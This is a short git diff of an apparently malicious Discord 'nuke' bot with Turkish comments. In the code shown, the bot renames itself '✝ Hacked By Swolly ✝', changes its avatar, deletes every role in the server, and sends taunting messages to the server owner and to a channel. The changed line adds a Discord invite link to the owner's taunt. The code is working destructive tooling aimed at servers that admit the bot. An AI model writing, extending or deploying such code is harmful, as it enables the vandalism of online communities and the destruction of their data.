@@ -97,7 +97,7 @@ client.on("message", async msg => {
     await client.user.setAvatar("http://sicanzi.com/"); //botun pp sini yapar
     await client.user.setUsername("✝ Hacked By Swolly ✝"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
     await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
-    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun"); //KURUCUSUNA GONDERILEN MESAJ
+    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/MfbH399"); //KURUCUSUNA GONDERILEN MESAJ
     const kanal = await msg.guild.channels.find(x => x.name === "Swolly-sikti");
     await kanal.send("Patladın Kardeşim Geçmiş Olsun");
   }
